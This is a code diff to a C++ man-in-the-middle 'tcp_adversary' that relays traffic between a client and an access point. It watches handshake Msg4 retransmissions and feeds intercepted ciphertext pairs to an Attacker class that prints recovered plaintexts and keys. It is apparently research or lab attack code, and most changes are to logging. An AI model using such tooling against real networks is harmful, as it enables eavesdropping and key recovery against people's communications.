@@ -79,7 +79,7 @@ void tcp_adversary::start_listening()
             {
                 break;
             }
-            printf("1...recv message from client\n");
+            // printf("1...recv message from client\n");
 
             data_process(buff, data_len);
 
@@ -88,12 +88,12 @@ void tcp_adversary::start_listening()
                 delete[] buff;
                 buff = NULL;
             }
-            printf("2...send message to AP\n");
+            // printf("2...send message to AP\n");
 
             if (!this->isMsg4)
             {
                 int response_len = client.wait_for_response(buff_resp);
-                printf("3...recv message from AP\n");
+                // printf("3...recv message from AP\n");
 
                 send_response(connect_fd_client, buff_resp, response_len);
                 if (buff_resp != NULL)
@@ -101,7 +101,7 @@ void tcp_adversary::start_listening()
                     delete[] buff_resp;
                     buff_resp = NULL;
                 }   
-                printf("4...send message to client\n");
+                // printf("4...send message to client\n");
             }
         }
         close(connect_fd_client);
@@ -152,12 +152,12 @@ void tcp_adversary::data_process(uint8_t* buff, int buff_len)
             {
                 this->isMsg4 = true;
                 this->isMsg4Arrived = true;
-                printf("Msg4(r+1)\n");
+                // printf("Msg4(r+1)\n");
             }
             else if (this->r == 3)  // this is Msg4(r+2, ACK) from client
             {
                 this->isMsg4ArrivedAgain = true;
-                printf("Msg4(r+2)\n");
+                // printf("Msg4(r+2)\n");
             }
         }
     }
@@ -204,32 +204,55 @@ void tcp_adversary::data_process(uint8_t* buff, int buff_len)
             {
                 this->isMsg4Arrived = false;
                 this->isMsg4ArrivedAgain = false;
-                printf("vec_mesg_before size: %ld\n", vec_mesg_before.size());
-                printf("vec_mesg_after size: %ld\n", vec_mesg_after.size());
 
-                Attacker myAttacker;
-                myAttacker.get_directory();
-                int size = vec_mesg_before.size() < vec_mesg_after.size()? vec_mesg_before.size():vec_mesg_after.size();
-
-                for (int index = 0; index < size; index++)
-                {
-                    myAttacker.get_plainText(vec_mesg_before[index], vec_mesg_after[index]);
-                }
-
+                printf("intercepted %ld pairs of secret messages: \n", vec_mesg_before.size());
                 for (int i = 0; i < vec_mesg_before.size(); i++)
                 {
+                    printf("message %d:\n", i);
                     for (int j = 0; j < vec_mesg_before[i].size(); j++)
                     {
-                        printf("%02x", vec_mesg_before[i][j]);
+                        printf("%02x", (unsigned char)vec_mesg_before[i][j]);
                     }
                     printf("\n");
                 }
                 printf("\n");
                 for (int i = 0; i < vec_mesg_after.size(); i++)
                 {
+                    printf("message %d: \n", i + (int)vec_mesg_before.size());
                     for (int j = 0; j < vec_mesg_after[i].size(); j++)
                     {
-                        printf("%02x", vec_mesg_after[i][j]);
+                        printf("%02x", (unsigned char)vec_mesg_after[i][j]);
+                    }
+                    printf("\n");
+                }
+                printf("\n");
+
+
+                Attacker myAttacker;
+                myAttacker.get_directory();
+                int size = vec_mesg_before.size() < vec_mesg_after.size()? vec_mesg_before.size():vec_mesg_after.size();
+
+                printf("Get %d pair of message\n", size);
+                for (int index = 0; index < size; index++)
+                {
+                    myAttacker.get_plainText(vec_mesg_before[index], vec_mesg_after[index]);
+                    printf("For pair %d, there are %ld possible plain text:\n", index, myAttacker.vec_plainText.size()/2);
+                    for (int i = 0; i < myAttacker.vec_plainText.size(); i = i+2)
+                    {
+                        cout << "plainText 1: " << myAttacker.vec_plainText[i] << endl;
+                        printf("key: ");
+                        for (int j = 0; j < myAttacker.vec_key[i].size(); j++)
+                        {
+                            printf("%02x", (unsigned char)myAttacker.vec_key[i][j]);
+                        }
+                        printf("\n");
+                        cout << "plainText 2: " << myAttacker.vec_plainText[i+1] << endl;
+                        printf("key: ");
+                        for (int j = 0; j < myAttacker.vec_key[i+1].size(); j++)
+                        {
+                            printf("%02x", (unsigned char)myAttacker.vec_key[i+1][j]);
+                        }
+                        printf("\n\n");
                     }
                     printf("\n");
                 }
